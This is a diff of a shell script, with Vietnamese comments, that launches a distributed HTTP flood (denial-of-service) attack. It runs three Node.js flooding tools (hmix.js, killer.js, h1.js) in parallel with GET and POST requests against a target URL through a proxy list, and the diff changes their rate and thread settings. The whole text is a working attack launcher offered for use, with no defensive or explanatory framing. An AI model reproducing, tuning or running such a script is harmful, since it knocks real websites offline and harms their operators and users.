@@ -39,19 +39,19 @@ export NODE_OPTIONS=--max-old-space-size=8192
 
 # Chạy tấn công với hmix.js
 for method in GET POST; do 
-  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 48 --full true -d false &
+  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
 done
 
 # Chạy tấn công với killer.js
 for method in GET POST; do 
-  node killer.js "$method" "$URL" "$TIME" 5 16 live.txt \
+  node killer.js "$method" "$URL" "$TIME" 1 32 live.txt \
     --query 1 --referer rand --http 1 \
     --close --randpath --parsed --reset --multipath 1 &
 done
 
 # Chạy tấn công với h1.js
 for method in GET POST; do 
-  node h1.js "$method" "$URL" live.txt "$TIME" 999 20 randomstring=true &
+  node h1.js "$method" "$URL" live.txt "$TIME" 32 10 randomstring=true &
 done
 
 wait
